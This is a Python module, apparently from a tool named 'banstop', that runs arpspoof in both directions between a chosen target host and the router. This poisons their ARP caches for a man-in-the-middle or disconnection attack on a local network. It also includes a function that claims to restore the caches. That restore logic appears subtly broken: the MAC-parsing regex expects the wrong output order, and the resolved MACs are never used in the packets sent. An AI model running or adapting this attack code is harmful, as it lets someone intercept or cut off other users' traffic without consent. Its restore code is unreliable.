import subprocess
import logging

log = logging.getLogger("banstop")


def arp_spoof_loop(interface, target_ip, router_ip, stop_event, status=None):
    proc_target = subprocess.Popen(
        ["arpspoof", "-i", interface, "-t", target_ip, router_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    proc_router = subprocess.Popen(
        ["arpspoof", "-i", interface, "-t", router_ip, target_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    try:
        stop_event.wait()
    finally:
        for p in (proc_target, proc_router):
            p.terminate()

        for p in (proc_target, proc_router):
            try:
                p.wait(timeout=2)
            except subprocess.TimeoutExpired:
                p.kill()


def restore_arp(interface, target_ip, router_ip):
    """
    Send gratuitous ARP replies to restore the target's ARP table.
    Tells the target that the router is at the router's real MAC,
    and tells the router that the target is at the target's real MAC.
    This undoes the ARP poisoning so both parties can communicate directly again.
    """
    # Get real MAC of the router
    result = subprocess.run(
        ["arping", "-c", "1", "-W", "1", "-I", interface, router_ip],
        capture_output=True, text=True
    )
    router_mac = _parse_arping_mac(result.stdout)

    # Get real MAC of the target
    result = subprocess.run(
        ["arping", "-c", "1", "-W", "1", "-I", interface, target_ip],
        capture_output=True, text=True
    )
    target_mac = _parse_arping_mac(result.stdout)

    if not router_mac or not target_mac:
        log.warning(f"Could not resolve MACs for ARP restore: router={router_mac}, target={target_mac}")
        return

    # Send ARP reply to target: "router is at router_mac"
    subprocess.run(
        ["arping", "-U", "-c", "3", "-I", interface, "-s", router_ip, router_ip],
        capture_output=True
    )

    # Send ARP reply to router: "target is at target_mac"
    subprocess.run(
        ["arping", "-U", "-c", "3", "-I", interface, "-s", target_ip, target_ip],
        capture_output=True
    )

    # Use arping -A (ARP reply) to directly inform both sides
    # Tell target: "I am the gateway" -> use -U to send unsolicited ARP reply
    _send_arp_reply(interface, target_ip, router_ip, router_mac)
    _send_arp_reply(interface, router_ip, target_ip, target_mac)

    log.info(f"ARP restored for {target_ip} <-> {router_ip}")


def _send_arp_reply(interface, src_ip, dst_ip, dst_mac):
    """Send a single ARP reply using arping."""
    subprocess.run(
        ["arping", "-A", "-c", "2", "-I", interface, "-s", src_ip, dst_ip],
        capture_output=True
    )


def _parse_arping_mac(output):
    """Extract MAC address from arping output."""
    import re
    match = re.search(r"\[(\d+\.\d+\.\d+\.\d+)\]\s+from\s+(\S+)", output)
    if match:
        return match.group(2)
    return None